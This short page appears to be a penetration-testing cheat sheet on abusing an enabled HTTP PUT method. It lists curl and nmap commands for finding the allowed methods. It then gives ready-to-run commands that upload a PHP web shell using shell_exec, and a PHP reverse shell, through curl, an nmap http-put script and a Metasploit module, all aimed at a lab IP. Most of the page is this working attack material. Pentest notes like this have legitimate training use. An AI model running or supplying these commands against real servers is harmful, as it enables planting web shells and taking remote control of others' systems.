---
description: >-
  If the HTTP PUT method is enabled on the webserver it can be used to upload a
  specified resource to the target server, such as a web shell, and execute it.
---

# HTTP PUT

## Determining allowed HTTP methods:

### Curl

```text
curl -v -X OPTIONS http://192.168.124.131/test/
```

### Nmap

```text
nmap --script http-methods --script-args http-methods.url-path='/test',http-methods.test-all -p 80 192.168.124.131
```

## Exploiting HTTP PUT for shell

### Curl

```text
curl -v -X PUT -d '<?php echo shell_exec($_GET[“cmd”]);?>' http://192.168.124.131/test/shell.php
```

### Nmap

```text
nmap -p 80 192.168.124.131 --script http-put --script-args http-put.url='/test/shell2.php',http-put.file='/root/Documents/php-reverse-shell.php'
```

### Metasploit

```text
use auxiliary/scanner/http/http_put
set rhosts 192.168.124.131
set rport 80
set path /test
set filename shell3.php
set filedata file://root/Documents/php-reverse-shell.php
run
```

